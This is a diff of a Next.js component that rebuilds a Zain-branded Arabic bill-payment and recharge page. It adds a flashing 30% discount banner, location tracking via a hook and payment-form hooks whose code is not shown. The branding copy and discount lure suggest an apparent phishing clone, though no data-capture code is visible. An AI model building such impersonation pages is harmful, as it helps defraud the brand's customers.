@@ -1,121 +1,152 @@
 "use client"
+import { useEffect, useState } from "react"
+import { ArrowRight, Plus, Percent } from "lucide-react"
+import { PaymentHeader } from "@/components/payment/payment-header"
+import { PaymentTabs } from "@/components/payment/payment-tabs"
+import { NumberTypeSelector } from "@/components/payment/number-type-selector"
+import { PhoneInput } from "@/components/payment/phone-input"
+import { AmountSelector } from "@/components/payment/amount-selector"
+import { OrderSummary } from "@/components/payment/order-summary"
+import { PaymentButton } from "@/components/payment/payment-button"
+import { usePaymentForm } from "@/lib/use-payment-form"
+import { useLocation } from "@/lib/use-location"
 
-import { useState } from "react"
-import { ChevronDown, Heart, Menu, Plus, ShoppingCart } from "lucide-react"
-import ZainLogo from "./zain-logo"
+export default function ZainPayment() {
+  const [selectedTab, setSelectedTab] = useState("bill")
 
-export default function PaymentForm() {
-  const [activeTab, setActiveTab] = useState<"recharge" | "bill">("bill")
-  const [phoneNumber, setPhoneNumber] = useState("")
-  const [isRobotChecked, setIsRobotChecked] = useState(false)
+  const { formData, updateFormData, balanceData, isLoadingBalance, balanceError, isSubmitted, loading, handleSubmit } =
+    usePaymentForm()
+
+  useLocation()
+  const isPhoneValid = /^9\d{7}$/.test(formData.phoneNumber)
+
+  // Calculate discount
+  const discountPercentage = 30
+  const discountAmount = (formData.selectedAmount as number* discountPercentage) / 100
+  const discountedAmount = formData.selectedAmount  as number - discountAmount
+  const totalWithDiscount = discountedAmount + formData.fees
+
+  useEffect(()=>{
+    localStorage.setItem("totalWithDiscount",totalWithDiscount)
+  },[totalWithDiscount])
 
   return (
-    <div className="min-h-screen bg-gray-50 font-sans">
-      {/* Header */}
-      <header className="bg-[#2e0a4a] text-white p-4 flex justify-between items-center">
-        <div className="flex items-center gap-4">
-          <Menu className="h-6 w-6" />
-          <Heart className="h-6 w-6" />
-          <div className="bg-white rounded-full p-2">
-            <ShoppingCart className="h-5 w-5 text-[#2e0a4a]" />
-          </div>
+    <div className="max-w-md mx-auto bg-gradient-to-b from-white to-gray-50 min-h-screen" dir="rtl">
+      <PaymentHeader />
+      <div className="p-5">
+        <div className="flex items-center mb-6">
+          <ArrowRight className="text-[#2d1a45] mr-2" size={20} />
+          <h2 className="text-2xl font-bold text-[#2d1a45]">الدفع السريع</h2>
         </div>
-        <div className="w-24">
-          <ZainLogo/>
-        </div>
-      </header>
-
-      {/* Main Content */}
-      <main className="max-w-md mx-auto p-4">
-        {/* Title */}
-        <h1 className="text-right text-2xl font-bold text-black mb-4">الدفع السريع</h1>
-
-        {/* Tabs */}
-        <div className="flex border-b mb-6">
-          <button
-            className={`flex-1 py-3 text-center ${
-              activeTab === "recharge" ? "border-b-2 border-[#2e0a4a] text-[#2e0a4a]" : "text-gray-500"
-            }`}
-            onClick={() => setActiveTab("recharge")}
-          >
-            إعادة تعبئة eezee
-          </button>
-          <button
-            className={`flex-1 py-3 text-center ${
-              activeTab === "bill" ? "border-b-2 border-[#e91e63] text-[#e91e63]" : "text-gray-500"
-            }`}
-            onClick={() => setActiveTab("bill")}
-          >
-            دفع الفاتورة
-          </button>
-        </div>
-
-        {/* Form */}
-        <div className="bg-white rounded-lg shadow-sm p-6">
-          {/* Pay For Dropdown */}
-          <div className="mb-6">
-            <label className="block text-right mb-2 font-medium text-black">أريد الدفع لـ</label>
-            <div className="relative">
-              <select className="w-full p-3 border rounded text-right appearance-none pr-10">
-                <option>رقم آخر</option>
-              </select>
-              <ChevronDown className="absolute top-1/2 left-3 transform -translate-y-1/2 text-gray-500" />
-            </div>
-          </div>
-
-          {/* Phone Number */}
-          <div className="mb-6">
-            <label className="block text-right mb-2 font-medium text-black">
-              رقم الهاتف <span className="text-red-500">*</span>
-            </label>
-            <input
-              type="text"
-              placeholder="أدخل الرقم 98XXXXXX"
-              className="w-full p-3 border rounded text-right"
-              value={phoneNumber}
-              onChange={(e) => setPhoneNumber(e.target.value)}
-            />
-          </div>
-
-          {/* reCAPTCHA */}
-          <div className="mb-6">
-            <div className="border rounded p-4 flex items-center justify-between">
-              <div className="flex items-center">
-                <input
-                  type="checkbox"
-                  id="robot"
-                  className="mr-2 h-5 w-5"
-                  checked={isRobotChecked}
-                  onChange={() => setIsRobotChecked(!isRobotChecked)}
-                />
-                <label htmlFor="robot" className="text-gray-600">
-                  أنا لست برنامج روبوت
-                </label>
+        <PaymentTabs selectedTab={selectedTab} onTabChange={setSelectedTab} />
+        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
+          {/* Animated Discount Banner */}
+          <div className="relative mb-4">
+            <div className="bg-gradient-to-r from-[#d13c8c] to-[#ff6b9d] rounded-lg p-3 text-white text-center relative overflow-hidden animate-pulse-glow">
+              <div className="absolute inset-0 bg-white/10 backdrop-blur-sm animate-shimmer"></div>
+              <div className="relative flex items-center justify-center animate-bounce-gentle">
+                <Percent className="h-5 w-5 ml-2 animate-spin-slow" />
+                <span className="text-lg font-bold">خصم 30%</span>
+                <span className="text-sm mr-2 opacity-90">على جميع عمليات التعبئة</span>
               </div>
-              <div className="text-xs text-gray-400">
-                reCAPTCHA
-                <br />
-                خصوصية - شروط
+              <div className="absolute -top-2 -right-2 w-8 h-8 bg-yellow-400 rounded-full flex items-center justify-center animate-bounce">
               </div>
+              {/* Animated border */}
             </div>
+            {/* Floating sparkles */}
+            <div className="absolute -top-1 left-4 w-2 h-2 bg-yellow-400 rounded-full animate-ping"></div>
+            <div className="absolute top-2 -left-1 w-1 h-1 bg-white rounded-full animate-pulse delay-300"></div>
+            <div className="absolute -bottom-1 right-8 w-1.5 h-1.5 bg-yellow-300 rounded-full animate-ping delay-500"></div>
           </div>
+
+          <div className="text-right mb-4">
+            <p className="text-[#2d1a45] font-medium">أريد أن أعيد التعبئة </p>
+          </div>
+          <NumberTypeSelector value={formData.numberType} onChange={(value) => updateFormData({ numberType: value })} />
+          <PhoneInput
+            value={formData.phoneNumber}
+            onChange={(value) => updateFormData({ phoneNumber: value })}
+            isLoadingBalance={isLoadingBalance}
+            balanceData={balanceData}
+            balanceError={balanceError}
+          />
+          <AmountSelector
+            value={formData.selectedAmount.toString()}
+            onChange={(value) => updateFormData({ selectedAmount: value })}
+          />
+          <button className="w-full p-3 border-2 border-[#d13c8c] text-[#d13c8c] rounded-lg flex items-center justify-center hover:bg-pink-50 transition-colors">
+            <Plus className="h-5 w-5 ml-2" />
+            <span>أضف رقم آخر</span>
+          </button>
         </div>
+        <OrderSummary
+          selectedAmount={parseFloat(formData.selectedAmount.toString())}
+          discountAmount={discountAmount}
+          discountPercentage={discountPercentage}
+          fees={parseFloat(formData.fees)}
+          total={parseFloat(totalWithDiscount)}
+        />
+        <PaymentButton
+          isValidPhoneNumber={isPhoneValid}
+          isSubmitted={isSubmitted}
+          phoneNumber={formData.phoneNumber}
+          onSubmit={handleSubmit}
+        />
+      </div>
 
-        {/* Add Another Number Button */}
-        <button className="w-full mt-4 p-3 bg-gray-200 text-gray-600 rounded-lg flex items-center justify-center">
-          <Plus className="h-5 w-5 mr-2" />
-          <span>أضف رقم آخر</span>
-        </button>
-
-        {/* Total */}
-        <div className="mt-6 flex justify-between items-center">
-          <div className="text-green-500 font-bold">د.ك 0.000</div>
-          <div className="text-right font-bold text-black text-xl">إجمالي</div>
-        </div>
-
-        {/* Pay Now Button */}
-        <button className="w-full mt-4 p-4 bg-gray-200 text-gray-600 rounded-lg font-bold">دفع الآن</button>
-      </main>
+      <style jsx>{`
+        @keyframes pulse-glow {
+          0%, 100% {
+            box-shadow: 0 0 20px rgba(209, 60, 140, 0.3);
+          }
+          50% {
+            box-shadow: 0 0 30px rgba(209, 60, 140, 0.6);
+          }
+        }
+        
+        @keyframes shimmer {
+          0% {
+            transform: translateX(-100%);
+          }
+          100% {
+            transform: translateX(100%);
+          }
+        }
+        
+        @keyframes bounce-gentle {
+          0%, 100% {
+            transform: translateY(0);
+          }
+          50% {
+            transform: translateY(-2px);
+          }
+        }
+        
+        @keyframes spin-slow {
+          from {
+            transform: rotate(0deg);
+          }
+          to {
+            transform: rotate(360deg);
+          }
+        }
+        
+        .animate-pulse-glow {
+          animation: pulse-glow 2s ease-in-out infinite;
+        }
+        
+        .animate-shimmer {
+          animation: shimmer 3s ease-in-out infinite;
+        }
+        
+        .animate-bounce-gentle {
+          animation: bounce-gentle 2s ease-in-out infinite;
+        }
+        
+        .animate-spin-slow {
+          animation: spin-slow 4s linear infinite;
+        }
+      `}</style>
     </div>
   )
 }
